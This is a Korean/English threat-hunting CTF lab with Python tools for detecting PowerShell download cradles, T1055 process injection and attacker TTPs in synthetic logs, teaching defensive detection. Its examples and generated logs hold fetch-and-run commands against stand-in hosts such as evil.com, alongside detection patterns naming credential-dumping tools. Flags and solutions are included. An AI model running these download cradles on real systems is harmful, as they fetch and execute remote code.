> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>
# 위협 헌팅 CTF 랩

## 개요

이 랩은 실제 공격자의 행동 패턴을 로그에서 직접 찾아내는 위협 헌팅(Threat Hunting) CTF 실습입니다. KQL/SPL을 활용한 PowerShell 다운로드 크래들 탐지, MITRE ATT&CK T1055 프로세스 인젝션 헌팅, 가짜 침해 로그에서 공격자 TTP 재구성의 세 시나리오로 구성됩니다.

**선수 지식**: SIEM 기본 개념, PowerShell 로깅, MITRE ATT&CK 프레임워크  
**소요 시간**: 약 3~4시간  
**난이도**: 중급~고급 (Intermediate-Advanced)

---

## 실습 1: KQL/SPL로 PowerShell 다운로드 크래들 탐지

### 목표

공격자가 자주 사용하는 PowerShell 다운로드 크래들(Download Cradle) 패턴을 KQL(Kusto Query Language) 및 SPL(Search Processing Language)을 사용하여 SIEM에서 탐지합니다. 샘플 로그에서 악성 패턴을 찾아 플래그를 획득합니다.

### 배경 지식

PowerShell 다운로드 크래들의 일반적인 패턴:
```powershell
# 유형 1: IEX + DownloadString
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')

# 유형 2: Invoke-Expression + WebRequest
Invoke-Expression (Invoke-WebRequest -Uri http://evil.com/payload -UseBasicParsing).Content

# 유형 3: EncodedCommand (Base64 인코딩으로 탐지 우회)
powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...

# 유형 4: Bitsadmin 우회
bitsadmin /transfer job /download /priority high http://evil.com/mal.exe C:\mal.exe
```

MITRE ATT&CK 매핑:
- T1059.001: PowerShell
- T1105: Ingress Tool Transfer
- T1027: Obfuscated Files or Information

### 힌트

1. PowerShell 이벤트 ID 4104(Script Block Logging)를 먼저 확인하세요.
2. Base64 디코딩: `[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(...))`
3. KQL에서 `contains`, `has`, `matches regex` 연산자를 조합하세요.
4. 플래그는 로그에서 특정 악성 도메인을 찾아 Base64 디코딩하면 획득됩니다.

### 샘플 로그 생성 및 분석

```python
#!/usr/bin/env python3
"""
PowerShell 다운로드 크래들 탐지 CTF 실습
샘플 로그 생성 및 KQL 쿼리 시뮬레이터
"""

import argparse
import base64
import json
import re
import sys
from datetime import datetime, timedelta
from pathlib import Path
import random

FLAG_B64 = base64.b64encode(b"CTF_FLAG{powershell_cradle_hunter}").decode()
MALICIOUS_DOMAIN = "c2-ctf-lab.evil.example"

def generate_sample_logs(count: int = 200) -> list[dict]:
    """샘플 Windows 이벤트 로그 생성 (정상 + 악성 혼합)"""
    logs: list[dict] = []
    base_time = datetime.now() - timedelta(hours=6)

    benign_commands = [
        "Get-Process",
        "Get-Service | Where-Object {$_.Status -eq 'Running'}",
        "Get-ChildItem C:\\Windows\\System32 | Select-Object Name, Length",
        "Import-Module ActiveDirectory; Get-ADUser -Filter *",
        "Set-ExecutionPolicy RemoteSigned -Scope CurrentUser",
        "$env:COMPUTERNAME",
        "Get-EventLog -LogName System -Newest 100",
        "Test-Path C:\\Windows\\System32\\cmd.exe",
    ]

    malicious_commands = [
        f"IEX (New-Object Net.WebClient).DownloadString('http://{MALICIOUS_DOMAIN}/stage1.ps1')",
        f"$c = New-Object Net.WebClient; $c.DownloadFile('http://{MALICIOUS_DOMAIN}/beacon.exe','C:\\Temp\\svchost32.exe')",
        f"powershell -enc {FLAG_B64[:40]}",
        f"Invoke-Expression (Invoke-WebRequest -Uri 'http://{MALICIOUS_DOMAIN}/payload' -UseBasicParsing).Content",
        f"Start-BitsTransfer -Source http://{MALICIOUS_DOMAIN}/tool.exe -Destination C:\\Windows\\Temp\\tool.exe",
        f"(New-Object System.Net.WebClient).DownloadString('http://{MALICIOUS_DOMAIN}/ps_flag.txt')",
    ]

    # 악성 플래그 로그 (숨겨둠)
    flag_log = {
        "EventID": 4104,
        "TimeGenerated": (base_time + timedelta(minutes=random.randint(60, 180))).isoformat(),
        "ComputerName": "DESKTOP-CTF001",
        "UserName": "CORP\\svc_backup",
        "Channel": "Microsoft-Windows-PowerShell/Operational",
        "ScriptBlockText": (
            f"$r=New-Object Net.WebClient;"
            f"$r.Headers.Add('X-Flag','{FLAG_B64}');"
            f"$r.DownloadString('http://{MALICIOUS_DOMAIN}/drop')"
        ),
        "Path": "",
        "TaskCategory": "Execute a Remote Command",
        "_malicious": True,
    }
    logs.append(flag_log)

    # 정상 로그 생성
    for i in range(count - len(malicious_commands) - 1):
        t = base_time + timedelta(minutes=i * 2)
        logs.append({
            "EventID": random.choice([4104, 4103, 400]),
            "TimeGenerated": t.isoformat(),
            "ComputerName": random.choice(["WS001", "WS002", "SRV-DC01", "LAPTOP-HR"]),
            "UserName": random.choice(["CORP\\jsmith", "CORP\\admin", "CORP\\mlee"]),
            "Channel": "Microsoft-Windows-PowerShell/Operational",
            "ScriptBlockText": random.choice(benign_commands),
            "Path": "",
            "TaskCategory": "Execute a Remote Command",
            "_malicious": False,
        })

    # 악성 로그 삽입
    for cmd in malicious_commands:
        t = base_time + timedelta(minutes=random.randint(10, 350))
        logs.append({
            "EventID": 4104,
            "TimeGenerated": t.isoformat(),
            "ComputerName": "DESKTOP-CTF001",
            "UserName": "CORP\\svc_backup",
            "Channel": "Microsoft-Windows-PowerShell/Operational",
            "ScriptBlockText": cmd,
            "Path": "",
            "TaskCategory": "Execute a Remote Command",
            "_malicious": True,
        })

    random.shuffle(logs)
    return logs

CRADLE_PATTERNS = [
    r"DownloadString\s*\(",
    r"DownloadFile\s*\(",
    r"Invoke-WebRequest",
    r"IEX\s*\(",
    r"Invoke-Expression",
    r"Start-BitsTransfer",
    r"-enc(?:odedCommand)?\s+[A-Za-z0-9+/=]{20,}",
    r"Net\.WebClient",
    r"WebClient\(\)",
]

def hunt_cradles(logs: list[dict], verbose: bool = False) -> list[dict]:
    """다운로드 크래들 패턴 탐지"""
    findings: list[dict] = []
    compiled = [re.compile(p, re.IGNORECASE) for p in CRADLE_PATTERNS]

    for log in logs:
        script = log.get("ScriptBlockText", "")
        matched_patterns: list[str] = []
        for pat, compiled_pat in zip(CRADLE_PATTERNS, compiled):
            if compiled_pat.search(script):
                matched_patterns.append(pat)

        if matched_patterns:
            findings.append({
                "time": log["TimeGenerated"],
                "computer": log["ComputerName"],
                "user": log["UserName"],
                "patterns": matched_patterns,
                "script": script[:200] + ("..." if len(script) > 200 else ""),
            })

            if verbose:
                print(f"\n[!] 탐지: {log['TimeGenerated']}")
                print(f"    컴퓨터: {log['ComputerName']} | 사용자: {log['UserName']}")
                print(f"    매칭 패턴: {', '.join(matched_patterns[:3])}")
                print(f"    스크립트: {script[:150]}...")

    return findings

def extract_flag_from_logs(logs: list[dict]) -> str | None:
    """로그에서 숨겨진 플래그 추출"""
    for log in logs:
        script = log.get("ScriptBlockText", "")
        b64_matches = re.findall(r"[A-Za-z0-9+/]{20,}={0,2}", script)
        for match in b64_matches:
            try:
                decoded = base64.b64decode(match + "==").decode("utf-8", errors="ignore")
                if decoded.startswith("CTF_FLAG"):
                    return decoded
            except Exception:
                continue

        if MALICIOUS_DOMAIN in script:
            header_match = re.search(r"X-Flag','([A-Za-z0-9+/=]+)'", script)
            if header_match:
                try:
                    return base64.b64decode(header_match.group(1) + "==").decode()
                except Exception:
                    pass
    return None

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="PowerShell 다운로드 크래들 헌팅 CTF 실습"
    )
    parser.add_argument("--generate", "-g", action="store_true", help="샘플 로그 생성")
    parser.add_argument("--hunt", "-u", action="store_true", help="크래들 패턴 헌팅")
    parser.add_argument("--flag", "-f", action="store_true", help="플래그 추출 시도")
    parser.add_argument("--logfile", default="/tmp/ctf_ps_logs.json", help="로그 파일 경로")
    parser.add_argument("--verbose", "-v", action="store_true", help="상세 출력")
    parser.add_argument("--count", type=int, default=200, help="생성할 로그 수")
    return parser.parse_args()

def main() -> None:
    args = parse_args()

    if args.generate:
        logs = generate_sample_logs(args.count)
        Path(args.logfile).write_text(json.dumps(logs, ensure_ascii=False, indent=2))
        print(f"[+] {args.count}개 로그 생성: {args.logfile}")
        malicious = sum(1 for l in logs if l.get("_malicious"))
        print(f"[*] 악성 로그: {malicious}개 (전체의 {malicious/args.count*100:.1f}%)")
        return

    logfile = Path(args.logfile)
    if not logfile.exists():
        print(f"[!] 로그 파일 없음. --generate 먼저 실행하세요.", file=sys.stderr)
        sys.exit(1)

    logs = json.loads(logfile.read_text())

    if args.hunt:
        print(f"[*] {len(logs)}개 로그에서 크래들 패턴 헌팅 중...")
        findings = hunt_cradles(logs, verbose=args.verbose)
        print(f"\n[+] 탐지 결과: {len(findings)}건")
        print(f"[*] KQL 쿼리 예시:")
        print("""
    SecurityEvent
    | where EventID == 4104
    | where ScriptBlockText has_any ("DownloadString", "IEX", "Invoke-Expression", "WebClient")
    | where ScriptBlockText matches regex @"http[s]?://"
    | project TimeGenerated, Computer, Account, ScriptBlockText
    | order by TimeGenerated desc
        """)

    if args.flag:
        print("[*] 플래그 추출 시도 중...")
        flag = extract_flag_from_logs(logs)
        if flag:
            print(f"[+] 플래그 발견: {flag}")
        else:
            print("[-] 플래그를 찾지 못했습니다. 더 많은 로그를 분석하세요.")

if __name__ == "__main__":
    main()
```

**플래그**: `CTF_FLAG{powershell_cradle_hunter}`

---

## 실습 2: MITRE ATT&CK T1055 (Process Injection) 로그 헌팅

### 목표

MITRE ATT&CK T1055 프로세스 인젝션 기법이 사용된 흔적을 로그에서 찾습니다. Sysmon 이벤트 로그(특히 Event ID 8: CreateRemoteThread, Event ID 10: ProcessAccess)를 분석하여 악성 인젝션을 탐지하고 플래그를 획득합니다.

### 배경 지식

프로세스 인젝션 탐지를 위한 핵심 Sysmon 이벤트:
| 이벤트 ID | 이름 | 의미 |
|-----------|------|------|
| 8 | CreateRemoteThread | 다른 프로세스에 스레드 생성 |
| 10 | ProcessAccess | 다른 프로세스 메모리 접근 |
| 1 | Process Create | 새 프로세스 시작 |
| 3 | Network Connection | 인젝션 후 C2 연결 |
| 7 | Image Load | DLL 로드 |

의심스러운 패턴:
- `lsass.exe`를 대상으로 한 ProcessAccess
- `explorer.exe` 또는 `svchost.exe`에 대한 CreateRemoteThread
- 비표준 경로에서 로드된 DLL
- 서명되지 않은 DLL이 신뢰된 프로세스에 로드됨

### 힌트

1. Sysmon Event ID 8에서 `SourceImage`와 `TargetImage`의 조합을 분석하세요.
2. 정상적인 `svchost.exe`는 `C:\Windows\System32\svchost.exe`에서만 실행됩니다.
3. `GrantedAccess` 값 `0x1F0FFF`는 PROCESS_ALL_ACCESS를 의미합니다 (매우 의심스러움).
4. 플래그는 악성 인젝션의 소스 프로세스, 대상 프로세스, 사용된 기법을 정확히 식별하면 생성됩니다.

### 풀이

```python
#!/usr/bin/env python3
"""
MITRE ATT&CK T1055 프로세스 인젝션 헌팅 도구
"""

import argparse
import json
import sys
from pathlib import Path
from dataclasses import dataclass

INJECTION_INDICATORS: dict[str, list] = {
    "suspicious_access_rights": [
        "0x1F0FFF",  # PROCESS_ALL_ACCESS
        "0x1F1FFF",  # PROCESS_ALL_ACCESS (변형)
        "0x143A",    # 메모리 읽기+쓰기+스레드 생성
    ],
    "high_value_targets": [
        "lsass.exe", "winlogon.exe", "csrss.exe",
        "explorer.exe", "svchost.exe", "spoolsv.exe"
    ],
    "suspicious_sources": [
        "cmd.exe", "powershell.exe", "wscript.exe",
        "cscript.exe", "mshta.exe", "rundll32.exe"
    ]
}

FLAG_SCENARIO = {
    "source": "powershell.exe",
    "target": "explorer.exe",
    "event_id": 8,
    "technique": "CreateRemoteThread",
    "access": "0x1F0FFF"
}

@dataclass
class InjectionAlert:
    time: str
    source: str
    target: str
    event_id: int
    access_rights: str
    technique: str
    risk_score: int

def analyze_sysmon_event(event: dict) -> InjectionAlert | None:
    eid = event.get("EventID", 0)
    if eid not in (8, 10):
        return None

    source = event.get("SourceImage", "").lower().split("\\")[-1]
    target = event.get("TargetImage", "").lower().split("\\")[-1]
    access = event.get("GrantedAccess", "")

    risk = 0
    if source in [s.lower() for s in INJECTION_INDICATORS["suspicious_sources"]]:
        risk += 40
    if target in [t.lower() for t in INJECTION_INDICATORS["high_value_targets"]]:
        risk += 40
    if access in INJECTION_INDICATORS["suspicious_access_rights"]:
        risk += 20

    if risk == 0:
        return None

    return InjectionAlert(
        time=event.get("TimeGenerated", ""),
        source=event.get("SourceImage", ""),
        target=event.get("TargetImage", ""),
        event_id=eid,
        access_rights=access,
        technique="CreateRemoteThread" if eid == 8 else "ProcessAccess",
        risk_score=risk,
    )

def check_flag_condition(alerts: list[InjectionAlert]) -> str | None:
    for alert in alerts:
        src_match = FLAG_SCENARIO["source"] in alert.source.lower()
        tgt_match = FLAG_SCENARIO["target"] in alert.target.lower()
        acc_match = alert.access_rights == FLAG_SCENARIO["access"]
        if src_match and tgt_match and acc_match:
            return "CTF_FLAG{process_injection_t1055_detected}"
    return None

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="T1055 프로세스 인젝션 헌팅 도구"
    )
    parser.add_argument("--logfile", "-l", required=True, help="Sysmon JSON 로그 파일")
    parser.add_argument("--min-risk", type=int, default=60, help="최소 위험 점수 (0-100)")
    parser.add_argument("--ctf-mode", action="store_true", help="CTF 플래그 검색 모드")
    return parser.parse_args()

def main() -> None:
    args = parse_args()
    logfile = Path(args.logfile)
    if not logfile.exists():
        print(f"[!] 파일 없음: {logfile}", file=sys.stderr)
        sys.exit(1)

    events = json.loads(logfile.read_text())
    alerts: list[InjectionAlert] = []

    for event in events:
        alert = analyze_sysmon_event(event)
        if alert and alert.risk_score >= args.min_risk:
            alerts.append(alert)

    print(f"[*] 분석 완료: {len(events)}개 이벤트 → {len(alerts)}개 경보")
    for alert in sorted(alerts, key=lambda a: a.risk_score, reverse=True):
        print(f"\n[위험도 {alert.risk_score}] {alert.technique}")
        print(f"  시간: {alert.time}")
        print(f"  소스: {alert.source}")
        print(f"  대상: {alert.target}")
        print(f"  접근권한: {alert.access_rights}")

    if args.ctf_mode:
        flag = check_flag_condition(alerts)
        if flag:
            print(f"\n[+] 플래그 획득: {flag}")
        else:
            print("\n[-] 플래그 조건 미충족. 모든 인젝션 이벤트를 분석하세요.")

if __name__ == "__main__":
    main()
```

**플래그**: `CTF_FLAG{process_injection_t1055_detected}`

---

## 실습 3: 가짜 침해 로그에서 공격자 TTP 재구성

### 목표

주어진 혼합 로그(정상 트래픽 + 공격자 활동)에서 공격자의 전술, 기법, 절차(TTP)를 재구성하고 공격 타임라인을 작성합니다. 올바른 공격 순서와 사용된 MITRE ATT&CK 기법을 식별하면 플래그를 획득합니다.

### 배경 지식

일반적인 공격 킬체인 단계:
```
정찰 → 초기 접근 → 실행 → 지속성 → 권한 상승 → 방어 우회 → 자격 증명 탈취 → 발견 → 측면 이동 → 수집 → C2 → 유출
```

### 힌트

1. 로그의 타임스탬프를 기준으로 이벤트를 정렬하면 공격 흐름이 보입니다.
2. 동일한 소스 IP에서 여러 이벤트가 발생했다면 그것이 공격자의 IP일 가능성이 높습니다.
3. `net user`, `whoami`, `ipconfig` 같은 정찰 명령 실행 후 측면 이동이 발생하는 패턴을 찾으세요.
4. 플래그는 올바른 순서로 5개의 공격 단계를 식별하고 각각의 MITRE ATT&CK ID를 매핑하면 획득합니다.

### 풀이

```python
#!/usr/bin/env python3
"""
침해 로그 TTP 재구성 CTF 도구
"""

import argparse
import json
import sys
from pathlib import Path
from collections import defaultdict

ATTACK_SEQUENCE = [
    {"order": 1, "technique": "T1190", "tactic": "Initial Access", "indicator": "exploit"},
    {"order": 2, "technique": "T1059.001", "tactic": "Execution", "indicator": "powershell"},
    {"order": 3, "technique": "T1078", "tactic": "Persistence", "indicator": "new_user"},
    {"order": 4, "technique": "T1548", "tactic": "Privilege Escalation", "indicator": "uac_bypass"},
    {"order": 5, "technique": "T1003", "tactic": "Credential Access", "indicator": "lsass_dump"},
]

TECHNIQUE_KEYWORDS: dict[str, list[str]] = {
    "T1190": ["exploit", "CVE-", "RCE", "injection", "404", "500", "sqlmap"],
    "T1059.001": ["powershell", "IEX", "DownloadString", "EncodedCommand", "-enc"],
    "T1078": ["net user /add", "New-LocalUser", "useradd", "CreateUser"],
    "T1548": ["bypassuac", "uac_bypass", "fodhelper", "eventvwr", "RunAs"],
    "T1003": ["lsass", "mimikatz", "sekurlsa", "procdump", "comsvcs"],
}

def classify_event(log_entry: dict) -> list[str]:
    """로그 항목에서 ATT&CK 기법 식별"""
    text = json.dumps(log_entry, ensure_ascii=False).lower()
    matched: list[str] = []
    for technique, keywords in TECHNIQUE_KEYWORDS.items():
        if any(kw.lower() in text for kw in keywords):
            matched.append(technique)
    return matched

def reconstruct_timeline(logs: list[dict]) -> dict[str, list[dict]]:
    """공격 타임라인 재구성"""
    timeline: dict[str, list[dict]] = defaultdict(list)
    for log in sorted(logs, key=lambda x: x.get("timestamp", "")):
        techniques = classify_event(log)
        for tech in techniques:
            timeline[tech].append(log)
    return dict(timeline)

def verify_attack_sequence(timeline: dict[str, list[dict]]) -> tuple[bool, list[str]]:
    """올바른 공격 순서 검증"""
    found_sequence: list[str] = []
    prev_time = ""

    for step in ATTACK_SEQUENCE:
        tech = step["technique"]
        if tech not in timeline:
            return False, found_sequence
        events = timeline[tech]
        if prev_time:
            valid_events = [e for e in events if e.get("timestamp", "") > prev_time]
            if not valid_events:
                return False, found_sequence
            prev_time = valid_events[0]["timestamp"]
        else:
            prev_time = events[0].get("timestamp", "")
        found_sequence.append(tech)

    return len(found_sequence) == 5, found_sequence

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="침해 로그 TTP 재구성 도구"
    )
    parser.add_argument("--logfile", "-l", required=True, help="혼합 로그 JSON 파일")
    parser.add_argument("--timeline", "-t", action="store_true", help="타임라인 출력")
    parser.add_argument("--verify", "-v", action="store_true", help="공격 순서 검증")
    return parser.parse_args()

def main() -> None:
    args = parse_args()
    logfile = Path(args.logfile)
    if not logfile.exists():
        print(f"[!] 파일 없음: {logfile}", file=sys.stderr)
        sys.exit(1)

    logs = json.loads(logfile.read_text())
    print(f"[*] 로그 분석 중: {len(logs)}개 항목")

    timeline = reconstruct_timeline(logs)

    if args.timeline:
        print("\n[*] ATT&CK 기법별 이벤트:")
        for tech, events in sorted(timeline.items()):
            print(f"  {tech}: {len(events)}개 이벤트")
            for e in events[:2]:
                print(f"    [{e.get('timestamp','')}] {str(e)[:100]}...")

    if args.verify:
        success, sequence = verify_attack_sequence(timeline)
        print(f"\n[*] 공격 순서 검증: {'성공' if success else '실패'}")
        print(f"    발견된 기법: {' → '.join(sequence)}")
        if success:
            print(f"\n[+] 플래그: CTF_FLAG{{ttp_reconstruction_complete}}")

if __name__ == "__main__":
    main()
```

**플래그**: `CTF_FLAG{ttp_reconstruction_complete}`

---

## 정리 및 핵심 요약

| 실습 | 기술 | 플래그 |
|------|------|--------|
| 실습 1 | KQL/SPL PowerShell 탐지 | `CTF_FLAG{powershell_cradle_hunter}` |
| 실습 2 | T1055 프로세스 인젝션 헌팅 | `CTF_FLAG{process_injection_t1055_detected}` |
| 실습 3 | TTP 재구성 | `CTF_FLAG{ttp_reconstruction_complete}` |

**참고 자료**
- [MITRE ATT&CK 프레임워크](https://attack.mitre.org/)
- [Sigma 탐지 룰 저장소](https://github.com/SigmaHQ/sigma)

---

<a name="english"></a>
# Threat Hunting CTF Lab

## Overview

This lab provides hands-on CTF exercises for finding attacker behavior patterns directly in logs. Three scenarios are included: detecting PowerShell download cradles using KQL/SPL, hunting for MITRE ATT&CK T1055 process injection, and reconstructing attacker TTPs from simulated compromise logs.

**Prerequisites**: SIEM fundamentals, PowerShell logging, MITRE ATT&CK framework  
**Estimated Time**: 3–4 hours  
**Difficulty**: Intermediate–Advanced

---

## Lab 1: Detecting PowerShell Download Cradles with KQL/SPL

### Objective

Detect PowerShell download cradle patterns commonly used by attackers using KQL and SPL in a SIEM. Find malicious patterns in sample logs to capture the flag.

### Common Download Cradle Patterns

```powershell
# Type 1: IEX + DownloadString
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')

# Type 2: Invoke-Expression + WebRequest
Invoke-Expression (Invoke-WebRequest -Uri http://evil.com/payload -UseBasicParsing).Content

# Type 3: EncodedCommand (Base64 encoding to evade detection)
powershell.exe -EncodedCommand SQBFAFgAIAAo...
```

### Hints

1. Start with PowerShell Event ID 4104 (Script Block Logging).
2. Base64 decode with: `[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(...))`
3. Combine `contains`, `has`, and `matches regex` operators in KQL.
4. The flag is obtained by finding a specific malicious domain and Base64-decoding the `X-Flag` header value.

**Flag**: `CTF_FLAG{powershell_cradle_hunter}`

---

## Lab 2: MITRE ATT&CK T1055 (Process Injection) Log Hunting

### Objective

Find traces of MITRE ATT&CK T1055 process injection in logs. Analyze Sysmon event logs (especially Event ID 8: CreateRemoteThread, Event ID 10: ProcessAccess) to detect malicious injection and capture the flag.

### Key Sysmon Events for Detection

| Event ID | Name | Significance |
|----------|------|-------------|
| 8 | CreateRemoteThread | Thread created in another process |
| 10 | ProcessAccess | Memory access to another process |
| 1 | Process Create | New process started |

### Hints

1. Analyze the combination of `SourceImage` and `TargetImage` in Sysmon Event ID 8.
2. Legitimate `svchost.exe` only runs from `C:\Windows\System32\svchost.exe`.
3. `GrantedAccess` value `0x1F0FFF` means PROCESS_ALL_ACCESS (highly suspicious).
4. The flag is generated when you correctly identify the source process, target process, and technique used in the malicious injection.

**Flag**: `CTF_FLAG{process_injection_t1055_detected}`

---

## Lab 3: Reconstructing Attacker TTPs from Fake Compromise Logs

### Objective

Reconstruct the attacker's Tactics, Techniques, and Procedures (TTPs) from mixed logs (normal traffic + attacker activity) and create an attack timeline. Capture the flag by correctly identifying the attack sequence and mapping each step to MITRE ATT&CK techniques.

### Attack Kill Chain

```
Reconnaissance → Initial Access → Execution → Persistence
→ Privilege Escalation → Defense Evasion → Credential Access
→ Discovery → Lateral Movement → Collection → C2 → Exfiltration
```

### Hints

1. Sort events by timestamp to reveal the attack flow.
2. Multiple events from the same source IP are likely from the attacker.
3. Look for the pattern: reconnaissance commands (`net user`, `whoami`, `ipconfig`) followed by lateral movement.
4. The flag is obtained by identifying 5 attack stages in the correct order, each mapped to its MITRE ATT&CK ID.

**Flag**: `CTF_FLAG{ttp_reconstruction_complete}`

---

## Summary

| Lab | Technique | Flag |
|-----|-----------|------|
| Lab 1 | KQL/SPL PowerShell Detection | `CTF_FLAG{powershell_cradle_hunter}` |
| Lab 2 | T1055 Process Injection Hunting | `CTF_FLAG{process_injection_t1055_detected}` |
| Lab 3 | TTP Reconstruction | `CTF_FLAG{ttp_reconstruction_complete}` |

**References**
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Sigma Detection Rules Repository](https://github.com/SigmaHQ/sigma)
